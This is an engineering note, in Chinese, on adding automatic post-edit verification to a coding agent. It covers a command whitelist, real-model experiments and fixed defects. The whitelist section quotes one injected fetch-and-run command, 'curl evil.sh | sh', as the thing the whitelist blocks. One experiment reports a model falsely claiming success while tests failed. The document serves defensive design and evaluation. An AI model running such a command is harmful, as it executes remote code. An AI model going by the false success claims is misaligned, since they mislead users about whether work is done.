# opt-30 · 编辑后自动验证（verifier）

## 这一步做了什么

以前一个回合的结束条件是**模型说完事了**。它说"已改好"，回合就结束，没人核对。
对照 Claude Code / Codex，这是最大的一个差距：它们改完会去跑项目自己的检查，
红了就继续改。这一步把这条闭环补上。

一个回合改过文件（`write_file` / `edit_file` 成功过），在 `finish` 之前：

```
跑项目自己的检查 → 绿：正常结束
                 → 红：错误原文喂回对话 → 回到同一个 thinking 循环让它改
                 → 连续红到上限：停手，并在最终回复里明说"仍未通过"
```

新文件 `src/verify/verifier.ts`，接进 `src/engine/loop.ts`（`LoopOptions.verifier`）。
`GB_VERIFY=0` 整体关掉，`GB_VERIFY_RETRY` 调自修上限（默认 2）。
每次验证发 `verify.started` / `verify.done`，日志、轨迹页、面板都能看到。

## 三个刻意的设计约束

**一、命令绝不来自模型。** 只从两个地方取，按顺序：`.glassbox/verify.json` →
`package.json` 的 scripts（`verify` > `typecheck` > `test` > `lint`）。
两处都没有就返回 `undefined`——**不猜**，不去试 `npm test` 看看会不会跑。

**二、单条命令白名单。** 命令头必须落在 `npm|pnpm|yarn|npx|node|cargo|go|make|gradle|mvn|python|pytest|tsc|deno|bun`，
且不允许出现 `; && | ` $() 换行`。挡的是"配置文件被写成 `npm test; curl evil.sh | sh`"。
**残留风险要说清楚**：没有沙箱，模型有 `write_file`，它可以改 `package.json` 里的 scripts。
白名单抬高了门槛，没有消除风险。

**三、验证器归 `Loop`，不做成插件钩子。** 因为它要能**打断收尾并重新进入循环**，
这是回合状态机的权力；插件只能在工具层面做事，做不到这件事。
spec 在构造时定好，回合中途不重新读取。

`clipOutput` 保留**头 1200 + 尾 800 字符**：编译器把错误摘要放在末尾，只留头部会把关键信息切掉。

## 真实模型实测

工作区 `/tmp` 下的一次性小项目：`src/sum.js` 导出 `add`，`src/util.js` 引用它，
`test/sum.test.js` 同时引用两者，`npm test` 基线为绿。模型 gpt-5.5。

### 实验一：重命名（改坏了没人管 vs 有人管）

任务「把 src/sum.js 里导出的 add 函数重命名为 plus」。

- `GB_VERIFY=0`：只改了 `sum.js`，`util.js` 和测试里的 `add` 引用留在原地，
  `npm test` 退出码 **1**，模型回复"已把 add 重命名为 plus"。**这就是没有验证的默认下限：报喜不报忧。**
- `GB_VERIFY=1`：三处全改对，`npm test` 绿，`[自动验证] 通过（302ms）`。

但这组**不能算验证器的功劳**：日志里只有一次验证、且直接通过，说明这次是模型自己改全了，
失败反馈回路根本没被触发。采样运气而已，我不拿它当收益。

### 实验二（无效设计，但暴露了两个问题）

为了强制回合结束时是红的，把提示改成「只改 src/sum.js 这一个文件」，跑 3 次：
**3 次都停在红色**。原因不是回路坏了——日志显示验证跑了 3 次（1 次 + 2 次自修，正好卡在上限），
每次都把 `SyntaxError: does not provide an export named 'add'` 喂了回去。
模型三轮的回答都是"已按要求修改，只改了 src/sum.js"。

**它在服从用户的禁令，而不是服从验证器。** 所以这组测的是"用户约束 vs 机械验证"的优先级，
不是自修能力，设计无效。顺带说：这个优先级本身是合理的，不该改。

同时它暴露了一个真缺陷（已修，见下）。

### 实验三：仓库本来就是红的（有效对照）

仓库初始红：`test/sum.test.js` 里 `import { add, mul }`，但 `sum.js` 没有 `mul`。
任务是无关的小改动「在 src/util.js 新增 average(xs)」，**没有任何"别动其它文件"的约束**。

- `GB_VERIFY=1`，3 次：**3/3 最终 `npm test` 退出码 0**。每次都是「验证未通过 → 补 `mul` → 再验通过」，
  各一轮自修搞定。并且**是补实现，不是删测试**（三个工作区的测试文件里 `mul` 都还在 3 处）。
- `GB_VERIFY=0` 对照：只加了 `average`，`mul` 仍然缺，最终退出码 **1**。

r1 的最终回复："我顺手修了这次自动验证暴露的另一个问题：src/sum.js 补了 mul(a, b) 导出，
避免测试里 import { add, mul } 报错。"——这句话只可能来自机械反馈，模型自己看不到这个失败。

## 实测抓出来的缺陷（已修）

**自修到上限后，最终回复被系统提示顶掉了。** 原来的写法是再 push 一条
`{ role:'system', content:'…已达自修上限…' }`，而 CLI 和面板都拿 `messages.at(-1)`
当"最终回复"——用户于是只看到那句系统提示，模型自己的话没了。实验二三次跑全中。

改成把这句话**接在模型那条 assistant 消息末尾**（`loop.ts` 的 `answer.content`），
最后一条仍然是 assistant。单测同步改成断言：最后一条 role 是 assistant，
且"已达自修上限"和模型原话都在里面。

## 已知代价，没修

失败输出喂回对话时**不走上下文预算**。实验二的日志里看到 `[上下文] 501/160 tok`——
一段 Node 报错就能把 160 tok 的预算撑到三倍。这是刻意的：把报错截短到预算内，
模型大概率就修不动了。但它意味着**红色回合的 token 成本明显高于绿色回合**，
不是"零成本兜底"。真要压，应该压 `clipOutput` 的阈值，而不是砍预算。

## 测试

`test/verify.test.ts` 14 条：白名单、detect 优先级、`verify.json` 覆盖 + 坏 JSON 回退、
两处都没有时返回 `undefined`、退出码语义、`clipOutput` 头尾都留、`needed()` 的门（只读回合不验）、
事件发射，以及 Loop 集成（失败喂回、通过不打扰、上限、无 verifier、失败的工具调用不算"动过文件"）。
全量 `npm test` 296 条通过，`tsc --noEmit` 干净。
